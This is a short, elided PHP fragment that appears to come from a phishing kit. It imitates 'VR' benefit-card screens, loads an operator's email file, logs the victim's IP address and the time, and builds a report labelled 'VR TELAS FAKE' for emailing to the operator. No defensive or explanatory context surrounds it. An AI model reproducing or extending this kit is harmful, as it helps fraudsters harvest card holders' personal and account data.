...
$lf = require_once('../operador/LUYZ-EMAIL.php'); 
...
$headers .= "From: VR TELAS \r\n";
$ip = $_SERVER["REMOTE_ADDR"];
$hora = $hora = date("Y-m-d   H:i:s");
$conteudo.="<b>===VR TELAS FAKE========</b><br>"; 
$conteudo.="<b>DATA E HORA :</b> $hora<br>";
